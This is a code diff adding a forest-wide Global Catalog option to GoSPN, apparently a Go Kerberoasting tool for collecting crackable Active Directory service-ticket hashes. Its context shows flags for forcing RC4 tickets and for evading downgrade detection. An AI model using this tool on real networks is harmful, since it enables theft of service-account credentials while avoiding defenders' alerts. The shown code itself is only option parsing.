@@ -38,6 +38,7 @@ func main() {
 		ldapOnly = flag.String("ldapfilter", "", "Additional raw LDAP filter ANDed with the user search")
 		tgtdeleg = flag.Bool("tgtdeleg", false, "Use the TGT-delegation trick to request RC4 (etype 23) service tickets")
 		rc4opsec = flag.Bool("rc4opsec", false, "OPSEC: skip accounts that advertise AES, so an RC4 request raises no downgrade signal")
+		gc       = flag.Bool("gc", false, "Query the forest-wide Global Catalog over LDAP (3268/3269) instead of the domain; requires -method ldap")
 		nobanner = flag.Bool("nobanner", false, "Suppress the GoSPN logo banner")
 	)
 	flag.Usage = usage
@@ -56,6 +57,7 @@ func main() {
 		ExtraFilter: strings.Trim(*ldapOnly, "\"'"),
 		TGTDeleg:    *tgtdeleg,
 		RC4OpSec:    *rc4opsec,
+		UseGC:       *gc,
 	}
 
 	if !*nobanner {
@@ -116,6 +118,7 @@ Examples:
   gospn -spn MSSQLSvc/db:1433              Roast one explicit SPN (no enumeration)
   gospn -method ldap -tgtdeleg             Roast everyone, forcing RC4 via tgtdeleg
   gospn -method adws -rc4opsec             Roast only RC4-native accounts (stealthy)
+  gospn -method ldap -gc                   Roast across the whole forest via the Global Catalog
   gospn -method adws -outfile out.txt      Write hashes to a file
   gospn -method ldap -stats                List roastable accounts only
 
